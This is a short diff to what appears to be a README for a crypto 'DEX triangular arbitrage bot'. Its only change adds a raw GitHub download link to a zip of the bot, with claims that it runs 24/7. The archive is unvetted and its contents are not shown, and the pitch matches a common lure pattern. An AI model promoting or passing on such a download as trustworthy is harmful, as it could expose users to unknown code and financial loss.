@@ -3,7 +3,7 @@ Decentralized exchange "DEX" Triangular Arbitrage Bot Version 4. Depending on th
 
 You can download zip file of the bot here
 
-
+https://github.com/JSNation4thchampion/JavaScript-Triangular-Arbitrage-Bot-v4/raw/main/JavaScript-DEX-Triangular-Arbitrage-Bot-v4.zip
 
 Here's a recent test I did of it of running 24/7 
 
